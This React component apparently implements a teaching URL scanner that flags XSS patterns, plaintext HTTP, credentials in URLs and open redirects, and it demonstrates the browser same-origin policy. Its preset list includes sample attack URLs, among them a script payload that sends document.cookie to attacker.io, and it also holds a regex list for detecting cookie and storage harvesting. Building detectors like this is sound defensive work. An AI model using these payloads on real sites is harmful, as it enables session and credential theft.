import React, { useState, useEffect, useMemo } from 'react';
import { motion } from 'framer-motion';
import { 
  Shield, ShieldAlert, ShieldCheck, ShieldX, 
  Lock, Unlock, AlertTriangle, Eye, 
  Terminal, Search, Play, RotateCcw, 
  Globe, Database, 
  Layers, ArrowLeft, Bug, Flame, Info, CheckCircle2, 
  XCircle, FileCode, Radio, Plus, Trash2
} from 'lucide-react';

interface SecurityCheckProps {
  onBackToHome?: () => void;
}

interface UrlAuditResult {
  url: string;
  isValid: boolean;
  protocol: string;
  hostname: string;
  port: string;
  pathname: string;
  search: string;
  hash: string;
  hasCredentials: boolean;
  credentialsUsername?: string;
  isHttps: boolean;
  isDangerousScheme: boolean;
  score: number;
  level: 'secure' | 'warning' | 'critical';
  checks: {
    id: string;
    name: string;
    passed: boolean;
    severity: 'info' | 'warning' | 'critical' | 'pass';
    message: string;
    recommendation: string;
  }[];
  detectedXssPatterns: {
    param: string;
    payload: string;
    type: string;
  }[];
  queryParams: { key: string; value: string; isSensitive: boolean }[];
  publicExposedData: { label: string; value: string; description: string; risk: 'low' | 'medium' | 'high' }[];
}

export const SecurityCheck: React.FC<SecurityCheckProps> = ({ onBackToHome }) => {
  const [inputUrl, setInputUrl] = useState('https://jasir.dev/portfolio?user=guest');
  const [activeTab, setActiveTab] = useState<'audit' | 'data-exposure' | 'sop-lab' | 'vectors'>('audit');
  const [isScanning, setIsScanning] = useState(false);

  // SOP & Local Storage interactive lab states
  const [localOriginStorage, setLocalOriginStorage] = useState<{ key: string; value: string }[]>([]);
  const [newKey, setNewKey] = useState('');
  const [newValue, setNewValue] = useState('');
  const [crossTabSimulationLog, setCrossTabSimulationLog] = useState<string[]>([]);
  const [isSimulatingCrossTab, setIsSimulatingCrossTab] = useState(false);
  
  // Interactive XSS Sanitizer Demo
  const [rawInputPayload, setRawInputPayload] = useState('<img src="x" onerror="alert(localStorage.getItem(\'auth_token\'))">');

  // Load current local storage items safely
  const refreshLocalStorage = () => {
    try {
      const items: { key: string; value: string }[] = [];
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        if (k) {
          items.push({ key: k, value: localStorage.getItem(k) || '' });
        }
      }
      setLocalOriginStorage(items);
    } catch {
      setLocalOriginStorage([]);
    }
  };

  useEffect(() => {
    refreshLocalStorage();
  }, []);

  const handleAddStorageItem = () => {
    if (!newKey.trim()) return;
    try {
      localStorage.setItem(newKey.trim(), newValue.trim());
      setNewKey('');
      setNewValue('');
      refreshLocalStorage();
    } catch (e) {
      console.error(e);
    }
  };

  const handleRemoveStorageItem = (keyToRemove: string) => {
    try {
      localStorage.removeItem(keyToRemove);
      refreshLocalStorage();
    } catch (e) {
      console.error(e);
    }
  };

  // Test Presets
  const PRESETS = [
    {
      label: 'Safe HTTPS',
      url: 'https://jasir.dev/portfolio?theme=cyber&lang=en',
      desc: 'Standard TLS encryption, clean parameters'
    },
    {
      label: 'Plaintext HTTP',
      url: 'http://insecure-portal.local/login?auth_token=super_secret_9942',
      desc: 'Unencrypted transport, sensitive tokens in query'
    },
    {
      label: 'Reflected XSS Vector',
      url: 'https://demo-vuln.org/search?q=<script>fetch("https://attacker.io/steal?c="+document.cookie)</script>',
      desc: 'Malicious <script> injection payload in query'
    },
    {
      label: 'JavaScript URI',
      url: 'javascript:alert("XSS: Stolen LocalStorage: " + JSON.stringify(localStorage))',
      desc: 'Dangerous pseudo-protocol direct execution'
    },
    {
      label: 'DOM Event Injection',
      url: 'https://vulnerable-site.net/profile#user=<img src=x onerror="alert(document.domain)">',
      desc: 'DOM-based event handler injection vector'
    },
    {
      label: 'Credentials in URL',
      url: 'https://admin:superSecretPass123@internal-server.corp/dashboard',
      desc: 'Plaintext basic credentials exposed in URL'
    }
  ];

  // Security Audit Engine
  const auditResult: UrlAuditResult = useMemo(() => {
    const raw = inputUrl.trim();
    if (!raw) {
      return {
        url: '',
        isValid: false,
        protocol: '',
        hostname: '',
        port: '',
        pathname: '',
        search: '',
        hash: '',
        hasCredentials: false,
        isHttps: false,
        isDangerousScheme: false,
        score: 0,
        level: 'critical',
        checks: [],
        detectedXssPatterns: [],
        queryParams: [],
        publicExposedData: []
      };
    }

    // Check for dangerous pseudo-protocols like javascript: or data:
    const isDangerousScheme = /^(javascript:|data:|vbscript:|file:)/i.test(raw);
    let parsedUrl: URL | null = null;
    let parseError = false;

    if (!isDangerousScheme) {
      try {
        // If user omitted protocol, prepend https:// for inspection
        const toParse = /^https?:\/\//i.test(raw) ? raw : `https://${raw}`;
        parsedUrl = new URL(toParse);
      } catch {
        parseError = true;
      }
    }

    const protocol = isDangerousScheme ? raw.split(':')[0] + ':' : (parsedUrl?.protocol || 'unknown:');
    const hostname = parsedUrl?.hostname || (isDangerousScheme ? 'N/A (Inline Script Context)' : 'Unknown');
    const port = parsedUrl?.port || (parsedUrl?.protocol === 'https:' ? '443' : parsedUrl?.protocol === 'http:' ? '80' : 'N/A');
    const pathname = parsedUrl?.pathname || '/';
    const search = parsedUrl?.search || '';
    const hash = parsedUrl?.hash || '';
    const hasCredentials = Boolean(parsedUrl && (parsedUrl.username || parsedUrl.password));
    const isHttps = protocol.toLowerCase() === 'https:';

    // Parse Query Params
    const queryParams: { key: string; value: string; isSensitive: boolean }[] = [];
    const sensitiveKeys = ['token', 'auth', 'secret', 'key', 'password', 'pwd', 'session', 'jwt', 'api_key', 'apikey'];
    
    if (parsedUrl) {
      parsedUrl.searchParams.forEach((value, key) => {
        const isSensitive = sensitiveKeys.some(s => key.toLowerCase().includes(s));
        queryParams.push({ key, value, isSensitive });
      });
    }

    // XSS Pattern Scanning
    const detectedXssPatterns: { param: string; payload: string; type: string }[] = [];
    const xssSignatures = [
      { pattern: /<script[\s\S]*?>[\s\S]*?<\/script>/gi, type: 'Script Tag Injection' },
      { pattern: /<script/gi, type: 'Opening Script Tag' },
      { pattern: /onerror\s*=/gi, type: 'Inline onerror Event Handler' },
      { pattern: /onload\s*=/gi, type: 'Inline onload Event Handler' },
      { pattern: /onclick\s*=/gi, type: 'Inline onclick Event Handler' },
      { pattern: /onmouseover\s*=/gi, type: 'Inline onmouseover Event Handler' },
      { pattern: /javascript\s*:/gi, type: 'JavaScript Protocol Scheme' },
      { pattern: /eval\s*\(/gi, type: 'Dynamic eval() Execution' },
      { pattern: /document\.cookie/gi, type: 'Cookie Access Probe' },
      { pattern: /document\.domain/gi, type: 'Domain Inspection Probe' },
      { pattern: /localStorage/gi, type: 'LocalStorage Harvesting Pattern' },
      { pattern: /sessionStorage/gi, type: 'SessionStorage Harvesting Pattern' },
      { pattern: /<img[^>]+src=[^>]+>/gi, type: 'HTML Image Injection' },
      { pattern: /<iframe[^>]*>/gi, type: 'IFrame Injection' },
      { pattern: /(%3C|<).*?(%3E|>)/gi, type: 'HTML Tag Delimiters' }
    ];

    // Scan full raw string, search params, and hash
    const targetsToScan = [
      { name: 'Full URL String', value: raw },
      { name: 'URL Query', value: search },
      { name: 'URL Hash Fragment', value: hash }
    ];

    queryParams.forEach(qp => {
      targetsToScan.push({ name: `Param "${qp.key}"`, value: qp.value });
    });

    xssSignatures.forEach(sig => {
      targetsToScan.forEach(target => {
        if (sig.pattern.test(target.value)) {
          if (!detectedXssPatterns.some(p => p.type === sig.type && p.param === target.name)) {
            detectedXssPatterns.push({
              param: target.name,
              payload: target.value.slice(0, 120),
              type: sig.type
            });
          }
        }
      });
    });

    // Calculate Audit Checks
    const checks: UrlAuditResult['checks'] = [];
    let calculatedScore = 100;

    // Check 1: Scheme / Protocol
    if (isDangerousScheme) {
      calculatedScore -= 70;
      checks.push({
        id: 'dangerous-scheme',
        name: 'Dangerous URI Scheme (javascript: / data:)',
        passed: false,
        severity: 'critical',
        message: `Detected executable pseudo-protocol "${protocol}". Browsers executing this execute arbitrary scripts in the active origin context.`,
        recommendation: 'Reject javascript: and data: URIs in all user navigation links, hrefs, and src attributes.'
      });
    } else if (!isHttps) {
      calculatedScore -= 35;
      checks.push({
        id: 'insecure-http',
        name: 'Unencrypted Transport Protocol (HTTP)',
        passed: false,
        severity: 'warning',
        message: 'The URL uses unencrypted plaintext HTTP. Data transmitted is vulnerable to Man-in-the-Middle (MitM) sniffing, tamper attacks, and ISP header injection.',
        recommendation: 'Enforce HTTPS everywhere with HSTS (Strict-Transport-Security: max-age=63072000; includeSubDomains; preload).'
      });
    } else {
      checks.push({
        id: 'secure-https',
        name: 'TLS / HTTPS Transport Encryption',
        passed: true,
        severity: 'pass',
        message: 'The URL specifies HTTPS protocol. Traffic in transit is encrypted using modern TLS cipher suites.',
        recommendation: 'Ensure modern TLS 1.3 is enforced and SSL/TLS certificates are auto-renewed.'
      });
    }

    // Check 2: XSS Vector Analysis
    if (detectedXssPatterns.length > 0) {
      calculatedScore -= 50;
      checks.push({
        id: 'xss-detected',
        name: 'Cross-Site Scripting (XSS) Patterns Flagged',
        passed: false,
        severity: 'critical',
        message: `Found ${detectedXssPatterns.length} potential injection signature(s) such as script tags, event handlers, or storage harvesting attempts.`,
        recommendation: 'Use contextual output encoding (e.g., React auto-escaping, DOMPurify), and deploy Content-Security-Policy (CSP) headers without "unsafe-inline".'
      });
    } else {
      checks.push({
        id: 'xss-clean',
        name: 'Input Vector & XSS Sanitization Audit',
        passed: true,
        severity: 'pass',
        message: 'No unencoded HTML tags, JavaScript event handlers, or common XSS payload signatures detected in parameters.',
        recommendation: 'Continue enforcing parameterized server endpoints and client-side sanitization libraries.'
      });
    }

    // Check 3: Credentials in URL
    if (hasCredentials) {
      calculatedScore -= 30;
      checks.push({
        id: 'cred-in-url',
        name: 'Basic Auth Credentials Exposed in URI',
        passed: false,
        severity: 'critical',
        message: `Credentials embedded in URL (user: "${parsedUrl?.username}"). URL credentials leak into browser history, web server access logs, and HTTP Referer headers.`,
        recommendation: 'Remove credentials from URIs. Use Authorization: Bearer <token> headers in HTTP requests.'
      });
    } else {
      checks.push({
        id: 'cred-clean',
        name: 'URI Credentials Verification',
        passed: true,
        severity: 'pass',
        message: 'No embedded username/password detected in the URL structure.',
        recommendation: 'Pass authentication tokens exclusively via HTTP request headers or HttpOnly cookies.'
      });
    }

    // Check 4: Sensitive Parameters in Query String
    const sensitiveParams = queryParams.filter(q => q.isSensitive);
    if (sensitiveParams.length > 0) {
      calculatedScore -= 20;
      checks.push({
        id: 'sensitive-query',
        name: 'Sensitive Tokens in URL Query String',
        passed: false,
        severity: 'warning',
        message: `URL contains sensitive query parameters: [${sensitiveParams.map(s => s.key).join(', ')}]. Query strings are logged by proxies, CDNs, and server logs.`,
        recommendation: 'Pass session identifiers and auth keys in HTTP POST bodies or encrypted session headers.'
      });
    } else {
      checks.push({
        id: 'query-clean',
        name: 'Query String Hygiene',
        passed: true,
        severity: 'pass',
        message: 'No obvious sensitive auth tokens or passwords detected in cleartext query parameters.',
        recommendation: 'Retain state in secure tokens and use POST for sensitive state transitions.'
      });
    }

    // Check 5: Open Redirect Pattern
    const redirectParam = queryParams.find(q => ['redirect', 'url', 'next', 'return', 'dest', 'target'].includes(q.key.toLowerCase()));
    if (redirectParam && (redirectParam.value.startsWith('http://') || redirectParam.value.startsWith('https://') || redirectParam.value.startsWith('//'))) {
      calculatedScore -= 15;
      checks.push({
        id: 'open-redirect',
        name: 'Potential Open Redirect Vector',
        passed: false,
        severity: 'warning',
        message: `Query parameter "${redirectParam.key}" points to an external destination ("${redirectParam.value}"). Phishers exploit this to bypass trust.`,
        recommendation: 'Validate redirect URLs against a strict domain whitelist or use relative path redirects only.'
      });
    } else {
      checks.push({
        id: 'redirect-clean',
        name: 'Open Redirect Inspection',
        passed: true,
        severity: 'pass',
        message: 'No unconstrained external redirect destinations identified in common routing keys.',
        recommendation: 'Verify that any destination routing strictly matches allowed origin prefixes.'
      });
    }

    // Check 6: Same-Origin Policy (SOP) & Cross-Tab Isolation
    checks.push({
      id: 'sop-isolation',
      name: 'Browser Same-Origin Policy (SOP) Sandbox Check',
      passed: true,
      severity: 'info',
      message: 'By standard browser architecture, this target cannot read other tabs’ localStorage or cookies across differing origins (protocol://domain:port).',
      recommendation: 'Never store high-risk secrets in localStorage where an in-origin XSS could read them; use HttpOnly cookies.'
    });

    const finalScore = Math.max(0, Math.min(100, calculatedScore));
    const level: 'secure' | 'warning' | 'critical' = 
      finalScore >= 80 ? 'secure' : finalScore >= 45 ? 'warning' : 'critical';

    // Public Exposed Data Breakdown
    const publicExposedData = [
      {
        label: 'Target Hostname / Domain',
        value: hostname,
        description: 'Transmitted publicly during DNS queries and in the TLS SNI (Server Name Indication) header.',
        risk: 'low' as const
      },
      {
        label: 'Target Scheme / Protocol',
        value: protocol,
        description: isHttps ? 'Encrypted via TLS' : 'Plaintext HTTP - inspectable by any router/ISP on the path',
        risk: isHttps ? 'low' as const : 'high' as const
      },
      {
        label: 'Path & Resource Endpoint',
        value: pathname,
        description: 'Exposed to reverse proxies, web server access logs, and browser history.',
        risk: 'low' as const
      },
      {
        label: 'Query Parameters & Values',
        value: search || '(None)',
        description: 'Visible in server logs, browser history, and leaked in HTTP Referer headers to external links.',
        risk: sensitiveParams.length > 0 || detectedXssPatterns.length > 0 ? 'high' as const : 'medium' as const
      },
      {
        label: 'Hash Fragment (#)',
        value: hash || '(None)',
        description: 'Client-side only. Not transmitted to servers in HTTP requests, but accessible to DOM scripts.',
        risk: 'low' as const
      },
      {
        label: 'Cross-Tab LocalStorage Accessibility',
        value: 'BLOCKED BY BROWSER (SOP)',
        description: 'External URLs cannot read other open tabs’ localStorage under any standard browser specification.',
        risk: 'low' as const
      }
    ];

    return {
      url: raw,
      isValid: !parseError,
      protocol,
      hostname,
      port,
      pathname,
      search,
      hash,
      hasCredentials,
      credentialsUsername: parsedUrl?.username,
      isHttps,
      isDangerousScheme,
      score: finalScore,
      level,
      checks,
      detectedXssPatterns,
      queryParams,
      publicExposedData
    };
  }, [inputUrl]);

  // Handle simulated scan trigger
  const handleTriggerScan = () => {
    setIsScanning(true);
    setTimeout(() => {
      setIsScanning(false);
    }, 450);
  };

  // Cross-Tab LocalStorage Isolation Test Experiment
  const handleSimulateCrossTabAccess = () => {
    setIsSimulatingCrossTab(true);
    setCrossTabSimulationLog([
      `[SANDBOX] Initializing isolated frame request to: "${auditResult.hostname}"...`,
      `[BROWSER] Current Origin: "${window.location.origin}"`,
      `[BROWSER] Target Origin: "${auditResult.protocol}//${auditResult.hostname}${auditResult.port !== '443' && auditResult.port !== '80' && auditResult.port !== 'N/A' ? `:${auditResult.port}` : ''}"`,
      `[EXECUTION] Attempting: foreignWindow.localStorage.getItem("session_token")...`
    ]);

    setTimeout(() => {
      if (auditResult.isDangerousScheme) {
        setCrossTabSimulationLog(prev => [
          ...prev,
          `[INTERCEPT] Dangerous inline scheme evaluated in active document context!`,
          `[CRITICAL] Inline scripts run within the active origin and can access active origin localStorage!`
        ]);
      } else {
        setCrossTabSimulationLog(prev => [
          ...prev,
          `[SANDBOX BLOCKED] DOMException: Blocked a frame with origin "${window.location.origin}" from accessing a cross-origin frame.`,
          `[SECURITY ENFORCED] Browser Same-Origin Policy (SOP) strictly prevented cross-tab storage leakage.`,
          `[RESULT] Other tabs' LocalStorage, Cookies, and SessionStorage remain 100% ISOLATED.`
        ]);
      }
      setIsSimulatingCrossTab(false);
    }, 800);
  };

  // Color Theme definitions based on score
  const colorMap = {
    secure: {
      border: 'border-highlight/50',
      bg: 'bg-highlight/10',
      text: 'text-highlight',
      badge: 'bg-highlight/20 text-highlight border-highlight/40',
      label: 'SECURED / COMPLIANT',
      glow: 'shadow-neon-highlight',
      icon: ShieldCheck
    },
    warning: {
      border: 'border-amber-400/50',
      bg: 'bg-amber-400/10',
      text: 'text-amber-400',
      badge: 'bg-amber-400/20 text-amber-400 border-amber-400/40',
      label: 'ELEVATED RISK / WARNING',
      glow: 'shadow-[0_0_20px_rgba(245,158,11,0.4)]',
      icon: ShieldAlert
    },
    critical: {
      border: 'border-accent/50',
      bg: 'bg-accent/10',
      text: 'text-accent',
      badge: 'bg-accent/20 text-accent border-accent/40',
      label: 'CRITICAL / DANGEROUS',
      glow: 'shadow-neon-accent',
      icon: ShieldX
    }
  };

  const currentTheme = colorMap[auditResult.level];
  const StatusIcon = currentTheme.icon;

  return (
    <div className="min-h-screen bg-bgMain text-white font-sans relative pb-24 selection:bg-primary selection:text-white">
      
      {/* Top Banner & Cyber Nav */}
      <header className="border-b border-white/10 bg-[#060a1c]/90 backdrop-blur-xl sticky top-0 z-40 px-4 md:px-8 py-3.5 flex flex-wrap items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          {onBackToHome && (
            <button
              onClick={onBackToHome}
              aria-label="Back to Portfolio Home"
              className="p-2 rounded-xl bg-white/5 hover:bg-white/10 text-muted hover:text-white border border-white/10 transition-all flex items-center gap-1.5 text-xs font-mono cursor-pointer"
            >
              <ArrowLeft className="w-4 h-4" />
              <span className="hidden sm:inline">Portfolio</span>
            </button>
          )}

          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-primary to-secondary p-0.5 flex items-center justify-center shadow-neon-primary">
              <Shield className="w-4 h-4 text-white" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-bold tracking-wider text-sm font-sans text-white">
                  CYBER<span className="text-secondary">SCAN</span>
                </span>
                <span className="px-2 py-0.5 rounded text-[10px] font-mono uppercase bg-primary/20 text-secondary border border-primary/40">
                  /check
                </span>
                <span className="hidden md:inline-flex items-center gap-1 text-[10px] font-mono text-highlight bg-highlight/10 px-2 py-0.5 rounded border border-highlight/20">
                  <span className="w-1.5 h-1.5 rounded-full bg-highlight animate-pulse" />
                  Live SOP Sandbox
                </span>
              </div>
              <p className="text-[11px] font-mono text-muted hidden sm:block">
                URL Security Scanner & Browser Tab Isolation Inspector
              </p>
            </div>
          </div>
        </div>

        {/* Origin info pill */}
        <div className="flex items-center gap-2 text-xs font-mono bg-white/5 border border-white/10 px-3 py-1.5 rounded-full">
          <Globe className="w-3.5 h-3.5 text-secondary" />
          <span className="text-muted hidden sm:inline">Active Origin:</span>
          <span className="text-white font-semibold">{window.location.origin}</span>
        </div>
      </header>

      {/* Main Container */}
      <main className="max-w-7xl mx-auto px-4 md:px-8 pt-8 space-y-8">
        
        {/* Intro Hero Section */}
        <div className="space-y-3">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-mono bg-primary/10 border border-primary/30 text-secondary">
            <Radio className="w-3.5 h-3.5 animate-pulse" />
            Security Research & Browser Sandbox Lab
          </div>
          <h1 className="text-2xl md:text-4xl font-extrabold tracking-tight text-white">
            Inspect URL Vulnerabilities & Tab Storage Isolation
          </h1>
          <p className="text-muted text-sm md:text-base max-w-3xl leading-relaxed">
            Experiment with <span className="text-secondary font-mono">XSS vectors</span>, unencrypted transports, 
            and learn how browsers isolate <span className="text-highlight font-mono">LocalStorage</span> between tabs using 
            the <span className="text-white font-semibold">Same-Origin Policy (SOP)</span>.
          </p>
        </div>

        {/* URL Input Box & Scanner Console */}
        <section className="p-5 md:p-7 rounded-2xl bg-cardBg border border-white/10 shadow-glass space-y-5 relative overflow-hidden">
          <div className="absolute top-0 right-0 w-96 h-96 bg-primary/5 rounded-full blur-3xl pointer-events-none" />

          <div className="space-y-2">
            <label htmlFor="url-input" className="block text-xs font-mono uppercase text-muted tracking-widest flex items-center gap-2">
              <Search className="w-3.5 h-3.5 text-primary" />
              Target URL to Analyze
            </label>
            <div className="flex flex-col sm:flex-row items-stretch gap-3">
              <div className="relative flex-1">
                <input
                  id="url-input"
                  type="text"
                  value={inputUrl}
                  onChange={(e) => setInputUrl(e.target.value)}
                  placeholder="Enter URL to inspect (e.g. https://target.com/page?query=data)"
                  className="w-full bg-[#030617] border border-white/20 focus:border-secondary focus:ring-1 focus:ring-secondary text-white font-mono text-sm px-4 py-3.5 rounded-xl outline-none transition-all placeholder:text-muted/50"
                />
                {inputUrl && (
                  <button
                    onClick={() => setInputUrl('')}
                    aria-label="Clear input"
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-muted hover:text-white p-1 rounded-md text-xs font-mono transition-colors"
                  >
                    Clear
                  </button>
                )}
              </div>

              <button
                onClick={handleTriggerScan}
                disabled={isScanning}
                className="px-6 py-3.5 rounded-xl bg-gradient-to-r from-primary to-secondary hover:brightness-110 text-white font-semibold text-sm shadow-neon-primary flex items-center justify-center gap-2 transition-all cursor-pointer flex-shrink-0 disabled:opacity-70"
              >
                {isScanning ? (
                  <>
                    <RotateCcw className="w-4 h-4 animate-spin" />
                    <span>Analyzing...</span>
                  </>
                ) : (
                  <>
                    <Play className="w-4 h-4 fill-white" />
                    <span>Scan Target</span>
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Quick Presets Deck */}
          <div className="space-y-2 pt-1 border-t border-white/5">
            <span className="text-[11px] font-mono text-muted uppercase tracking-wider block">
              Load Attack & Defense Presets:
            </span>
            <div className="flex flex-wrap gap-2">
              {PRESETS.map((preset, idx) => (
                <button
                  key={idx}
                  onClick={() => {
                    setInputUrl(preset.url);
                    handleTriggerScan();
                  }}
                  title={preset.desc}
                  className="text-xs font-mono px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 hover:border-secondary/40 text-muted hover:text-white transition-all flex items-center gap-1.5 cursor-pointer"
                >
                  <span className="w-1.5 h-1.5 rounded-full bg-secondary" />
                  <span>{preset.label}</span>
                </button>
              ))}
            </div>
          </div>
        </section>

        {/* Dynamic Security Level & Score Card */}
        <section 
          className={`p-6 md:p-8 rounded-2xl border transition-all duration-500 relative overflow-hidden ${currentTheme.border} ${currentTheme.bg} ${currentTheme.glow}`}
        >
          <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6 relative z-10">
            
            {/* Score & Badge */}
            <div className="flex items-center gap-5">
              <div className="relative flex items-center justify-center w-20 h-20 rounded-2xl bg-black/40 border border-white/10 shadow-inner flex-shrink-0">
                <StatusIcon className={`w-10 h-10 ${currentTheme.text} animate-float-slow`} />
              </div>
              <div className="space-y-1">
                <div className="flex items-center gap-2">
                  <span className={`px-2.5 py-0.5 rounded-full text-xs font-bold font-mono tracking-wider border ${currentTheme.badge}`}>
                    {currentTheme.label}
                  </span>
                  <span className="text-xs font-mono text-muted">
                    Risk Score: <strong className="text-white">{auditResult.score} / 100</strong>
                  </span>
                </div>
                <h2 className="text-xl md:text-2xl font-bold text-white">
                  {auditResult.level === 'secure' && 'Safe & Encrypted Transport'}
                  {auditResult.level === 'warning' && 'Vulnerability / Risk Detected'}
                  {auditResult.level === 'critical' && 'Critical Exploit Vector Detected!'}
                </h2>
                <p className="text-xs md:text-sm text-muted font-mono truncate max-w-xl">
                  Target: {auditResult.url || 'No URL specified'}
                </p>
              </div>
            </div>

            {/* Quick Metrics */}
            <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 w-full md:w-auto font-mono text-xs">
              <div className="p-3 rounded-xl bg-black/40 border border-white/10 space-y-1">
                <span className="text-muted block text-[10px] uppercase">Protocol</span>
                <span className={`font-semibold flex items-center gap-1 ${auditResult.isHttps ? 'text-highlight' : 'text-accent'}`}>
                  {auditResult.isHttps ? <Lock className="w-3.5 h-3.5" /> : <Unlock className="w-3.5 h-3.5" />}
                  {auditResult.protocol}
                </span>
              </div>

              <div className="p-3 rounded-xl bg-black/40 border border-white/10 space-y-1">
                <span className="text-muted block text-[10px] uppercase">XSS Vectors</span>
                <span className={`font-semibold ${auditResult.detectedXssPatterns.length > 0 ? 'text-accent' : 'text-highlight'}`}>
                  {auditResult.detectedXssPatterns.length > 0 ? `${auditResult.detectedXssPatterns.length} FLAGGED` : '0 (CLEAN)'}
                </span>
              </div>

              <div className="p-3 rounded-xl bg-black/40 border border-white/10 space-y-1 col-span-2 sm:col-span-1">
                <span className="text-muted block text-[10px] uppercase">Tab Isolation</span>
                <span className="text-secondary font-semibold">
                  SOP ENFORCED
                </span>
              </div>
            </div>
          </div>

          {/* Scanning Progress Bar Animation */}
          {isScanning && (
            <div className="absolute bottom-0 left-0 right-0 h-1 bg-white/10 overflow-hidden">
              <motion.div 
                className="h-full bg-gradient-to-r from-primary via-secondary to-highlight"
                initial={{ x: '-100%' }}
                animate={{ x: '100%' }}
                transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
              />
            </div>
          )}
        </section>

        {/* Tab Navigation Controls */}
        <div className="flex flex-wrap gap-2 border-b border-white/10 pb-2">
          {[
            { id: 'audit', label: '1. Security Audit Findings', icon: ShieldCheck },
            { id: 'data-exposure', label: '2. Public Data vs Tab Storage', icon: Database },
            { id: 'sop-lab', label: '3. Browser SOP & Tab Isolation Lab', icon: Layers },
            { id: 'vectors', label: '4. Attack Vectors & XSL Notes', icon: Bug },
          ].map(tab => {
            const Icon = tab.icon;
            const isActive = activeTab === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id as any)}
                className={`px-4 py-2.5 rounded-xl font-mono text-xs font-semibold flex items-center gap-2 transition-all cursor-pointer ${
                  isActive
                    ? 'bg-primary text-white shadow-neon-primary border border-primary/60'
                    : 'bg-white/5 hover:bg-white/10 text-muted hover:text-white border border-white/10'
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                <span>{tab.label}</span>
              </button>
            );
          })}
        </div>

        {/* TAB 1: AUDIT FINDINGS */}
        {activeTab === 'audit' && (
          <div className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {auditResult.checks.map(check => {
                let badgeClass = 'text-highlight border-highlight/40 bg-highlight/10';
                let Icon = CheckCircle2;
                if (check.severity === 'critical') {
                  badgeClass = 'text-accent border-accent/40 bg-accent/10';
                  Icon = XCircle;
                } else if (check.severity === 'warning') {
                  badgeClass = 'text-amber-400 border-amber-400/40 bg-amber-400/10';
                  Icon = AlertTriangle;
                } else if (check.severity === 'info') {
                  badgeClass = 'text-secondary border-secondary/40 bg-secondary/10';
                  Icon = Info;
                }

                return (
                  <div 
                    key={check.id}
                    className="p-5 rounded-xl bg-cardBg border border-white/10 hover:border-white/20 transition-all space-y-3"
                  >
                    <div className="flex items-start justify-between gap-3">
                      <div className="flex items-center gap-2 font-semibold text-sm text-white">
                        <Icon className="w-4 h-4 flex-shrink-0" />
                        <span>{check.name}</span>
                      </div>
                      <span className={`px-2 py-0.5 rounded text-[10px] font-mono uppercase border ${badgeClass}`}>
                        {check.severity}
                      </span>
                    </div>

                    <p className="text-xs text-muted leading-relaxed">
                      {check.message}
                    </p>

                    <div className="pt-2 border-t border-white/5 text-[11px] font-mono text-secondary/90 bg-white/[0.02] p-2.5 rounded-lg">
                      <strong className="text-muted block text-[10px] uppercase mb-0.5">Remediation:</strong>
                      {check.recommendation}
                    </div>
                  </div>
                );
              })}
            </div>

            {/* Detected Injection Signatures Card if any */}
            {auditResult.detectedXssPatterns.length > 0 && (
              <div className="p-6 rounded-2xl bg-accent/5 border border-accent/40 space-y-4">
                <div className="flex items-center gap-2 text-accent font-bold text-sm">
                  <Flame className="w-4 h-4" />
                  <span>Flagged Attack Injection Signatures ({auditResult.detectedXssPatterns.length})</span>
                </div>
                <div className="space-y-3 font-mono text-xs">
                  {auditResult.detectedXssPatterns.map((pat, i) => (
                    <div key={i} className="p-3 bg-black/60 border border-accent/30 rounded-xl space-y-1">
                      <div className="flex items-center justify-between text-muted text-[11px]">
                        <span>Location: <strong className="text-white">{pat.param}</strong></span>
                        <span className="text-accent">{pat.type}</span>
                      </div>
                      <div className="text-accent/90 break-all p-2 bg-accent/10 rounded border border-accent/20">
                        {pat.payload}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}

        {/* TAB 2: DATA EXPOSURE BREAKDOWN */}
        {activeTab === 'data-exposure' && (
          <div className="space-y-6">
            <div className="p-5 rounded-2xl bg-cardBg border border-white/10 space-y-4">
              <div className="space-y-1">
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  <Eye className="w-4 h-4 text-secondary" />
                  Public Network Exposure vs Browser Tab Isolation
                </h3>
                <p className="text-xs text-muted">
                  What information does this URL broadcast across the internet, and what is protected inside the browser sandbox?
                </p>
              </div>

              {/* Public Exposure Table */}
              <div className="overflow-x-auto">
                <table className="w-full text-left font-mono text-xs border-collapse">
                  <thead>
                    <tr className="border-b border-white/10 text-muted uppercase text-[10px]">
                      <th className="py-2.5 px-3">Data Component</th>
                      <th className="py-2.5 px-3">Extracted Value</th>
                      <th className="py-2.5 px-3">Exposure Scope</th>
                      <th className="py-2.5 px-3">Risk Tier</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-white/5">
                    {auditResult.publicExposedData.map((item, idx) => (
                      <tr key={idx} className="hover:bg-white/[0.02]">
                        <td className="py-3 px-3 font-semibold text-white">{item.label}</td>
                        <td className="py-3 px-3 text-secondary break-all max-w-xs">{item.value}</td>
                        <td className="py-3 px-3 text-muted text-[11px]">{item.description}</td>
                        <td className="py-3 px-3">
                          <span className={`px-2 py-0.5 rounded text-[10px] uppercase font-bold ${
                            item.risk === 'high' 
                              ? 'bg-accent/20 text-accent border border-accent/40' 
                              : item.risk === 'medium'
                              ? 'bg-amber-400/20 text-amber-400 border border-amber-400/40'
                              : 'bg-highlight/20 text-highlight border border-highlight/40'
                          }`}>
                            {item.risk}
                          </span>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>

            {/* Query Parameters Detail */}
            <div className="p-5 rounded-2xl bg-cardBg border border-white/10 space-y-4">
              <h3 className="text-sm font-bold text-white flex items-center gap-2">
                <Database className="w-4 h-4 text-primary" />
                Decoded URL Query Parameters ({auditResult.queryParams.length})
              </h3>
              {auditResult.queryParams.length === 0 ? (
                <div className="p-4 rounded-xl bg-black/40 border border-white/5 text-muted text-xs font-mono text-center">
